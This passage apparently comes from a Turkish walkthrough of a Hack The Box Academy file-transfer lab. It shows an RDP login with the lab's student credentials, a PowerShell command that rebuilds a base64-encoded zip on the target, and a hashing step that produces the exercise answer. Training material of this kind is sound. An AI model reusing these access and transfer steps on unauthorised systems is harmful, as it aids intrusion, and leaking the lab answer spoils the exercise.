    UEsDBAoAAAAAAFmEKVFHXocmIAAAACAAAAAOAAAAdXBsb2FkX3dpbi50eHRlNGZlZWM0NjZkNWRlNzAxMDg5YjVjYzFiZjZkNTkyYVBLAQI/AAoAAAAAAFmEKVFHXocmIAAAACAAAAAOACQAAAAAAAAAIAAAAAAAAAB1cGxvYWRfd2luLnR4dAoAIAAAAAAAAQAYAHjm8KnohtYBzETj5fqG1gEXkIab6IbWAVBLBQYAAAAAAQABAGAAAABMAAAAAAA=
    ```

    Aşağıdaki komut ile hedefe RDP bağlantısı gerçekleştir:

    ```bash
    xfreerdp /dynamic-resolution /v:10.129.201.55 /u:htb-student /p:'HTB_@cademy_stdnt!'
    ```

    Windows makinesine bağlandıktan sonra PowerShell ile aşağıdaki komutu çalıştır:

    ```powershell
    [IO.File]::WriteAllBytes("C:\Users\htb-student\Desktop\upload_win.zip", [Convert]::FromBase64String("UEsDBAoAAAAAAFmEKVFHXocmIAAAACAAAAAOAAAAdXBsb2FkX3dpbi50eHRlNGZlZWM0NjZkNWRlNzAxMDg5YjVjYzFiZjZkNTkyYVBLAQI/AAoAAAAAAFmEKVFHXocmIAAAACAAAAAOACQAAAAAAAAAIAAAAAAAAAB1cGxvYWRfd2luLnR4dAoAIAAAAAAAAQAYAHjm8KnohtYBzETj5fqG1gEXkIab6IbWAVBLBQYAAAAAAQABAGAAAABMAAAAAAA="))
    ```

    Oluşturulan arşiv içindeki metin dosyasını masaüstüne çıkar ve aşağıdaki komutu çalıştır:

    ```powershell
    hasher "C:\Users\htb-student\Desktop\upload_win.txt"
    ```

    Çıktıda görülen hash cevap olarak kullanılacaktır.
